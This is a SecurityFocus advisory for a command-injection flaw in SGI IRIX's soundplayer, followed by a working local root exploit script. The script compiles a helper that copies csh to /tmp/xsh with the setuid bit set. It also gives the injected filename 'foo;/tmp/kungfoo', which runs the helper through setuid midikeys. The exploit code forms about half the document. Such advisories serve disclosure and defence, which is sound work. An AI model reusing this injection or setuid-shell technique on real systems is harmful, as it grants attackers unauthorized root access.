source: http://www.securityfocus.com/bid/909/info

SGI's Irix operating system ships with an X11 application called 'soundplayer' which is used to play .WAV files. It is not setuid root by itself, but can inherit root priviliges if called by midikeys (which is setuid on some old IRIX systems). Soundplayer is vulnerable to an input validation problem. When saving a file to disk with soundplayer, if a semicolon is appended to the end of the "proper" or "real" filename input followed by a command to be executed (no spaces), the command will run with the privileges soundplayer has (elevated or not). It is possible to compromise root access locally through exploitation of this vulnerability if soundplayer is executed (then exploited..) through setuid midikeys.

#!/bin/sh
#
# Irix 6.x soundplayer xploit - Loneguard 20/02/99
#
# Good example of how bad coding in a non-setuid/priviledged process
# can offer up rewt
#
cat > /tmp/crazymonkey.c << 'EOF'
main() {
setuid(0);
system("cp /bin/csh /tmp/xsh;chmod 4755 /tmp/xsh");
}
EOF
cc -o /tmp/kungfoo crazymonkey.c
/usr/sbin/midikeys &
echo "You should now see the midikeys window, goto the menu that allows you to play sounds and load a wav. This will bring
up a soundplayer window. Save the wav as 'foo;/tmp/kungfoo' and go find a rewt shell in tmp"